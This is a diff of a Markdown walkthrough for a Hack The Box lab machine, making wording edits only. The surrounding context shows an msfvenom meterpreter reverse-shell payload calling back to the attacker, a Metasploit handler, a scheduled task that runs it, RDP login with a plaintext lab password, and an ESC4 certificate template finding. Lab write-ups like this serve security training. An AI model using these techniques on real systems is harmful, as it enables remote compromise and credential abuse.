@@ -362,8 +362,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9001 -f exe -o 
 
 ![Uploading the Payload to the Target](image%2034.png)
 
-Uploading the Payload to the Target
-
 We create a new handler in **Metasploit**, configure the following options, and run the module:
 
 ```bash
@@ -379,7 +377,7 @@ We also place a PE binary named `meter.exe` on our Windows host in the same dire
 
 ![image.png](image%2035.png)
 
-We use the **New Event** window and select the file from the Browse menu. We also set the time to five minutes ahead of local time to allow the task ample time to execute on the remote host:
+We use the **New Event** window and select the file from the Browse menu. We also set the time to five minutes ahead of the local time to give the task ample time to execute on the remote host:
 
 ![image.png](image%2036.png)
 
@@ -448,7 +446,7 @@ Opening the `.html` file in a web browser reveals a recovery key for a **BitLock
 
 ### RDP Access on the Host
 
-After reviewing the BloodHound data, we see that the `o.martinez` user is a member of the **Remote Desktop Users**, meaning we can login via RDP:
+After reviewing the BloodHound data, we see that the `o.martinez` user is a member of the **Remote Desktop Users** domain group, meaning we can login to the host via RDP:
 
 ![image.png](image%2047.png)
 
@@ -466,7 +464,7 @@ remmina -c rdp://o.martinez:M%40rtinez_P%40ssw0rd%21@10.10.11.31:3389
 
 ### BitLocker Decryption
 
-Enumerating the target host using **File Explorer** reveals the encrypted BitLocker volume mounted on the `E:` drive:
+Enumerating the target host using **File Explorer** reveals an encrypted BitLocker volume mounted on the `E:` drive:
 
 ![image.png](image%2050.png)
 
@@ -540,7 +538,7 @@ Certificate Templates
     Template Name                       : Infiltrator_Template
     Display Name                        : Infiltrator_Template
     Certificate Authorities             : infiltrator-DC01-CA
-<SNIP>
+...
     [+] User ACL Principals             : INFILTRATOR.HTB\infiltrator_svc
     [!] Vulnerabilities
       ESC4                              : User has dangerous permissions.
